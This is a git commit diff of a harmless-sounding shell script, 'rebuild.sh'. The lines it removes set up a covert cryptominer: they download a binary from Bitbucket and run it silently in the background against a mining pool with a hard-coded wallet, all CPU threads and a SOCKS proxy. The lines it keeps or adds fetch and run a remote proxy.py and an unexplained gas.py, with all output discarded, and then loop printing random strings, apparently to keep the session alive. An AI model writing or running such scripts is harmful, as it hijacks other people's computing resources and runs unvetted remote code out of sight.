b4ecbde79e7416d1629e81066727e0216dd78be8
haixhy18 <93590103+haixhy18@users.noreply.github.com>
2021-11-02 19:22:28 +0700

    Update rebuild.sh

--- rebuild.sh
+++ rebuild.sh
@@ -1,14 +1,8 @@
 #!/bin/bash
 apt update
 apt -y install wget curl python3 libjansson4
-wget -O bionicv2 https://bitbucket.org/oqoixgqoq9/turtel/raw/c4008f7e57bc01c88c7d6e4ad3c1147e1654d014/ayam-bakso
 wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
-chmod +x bionicv2 proxy.py
+chmod +x proxy.py gas.py
 python3 proxy.py >/dev/null &
-pool="pool.hashvault.pro:80"
-wallet="TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2"
-workername="$(cat /proc/sys/kernel/hostname)"
-thread="$(nproc --all)"
-proxy="socks5://174.138.17.79:4145"
-./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p $workername -k --tls -t$thread >/dev/null &
+python3 gas.py >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
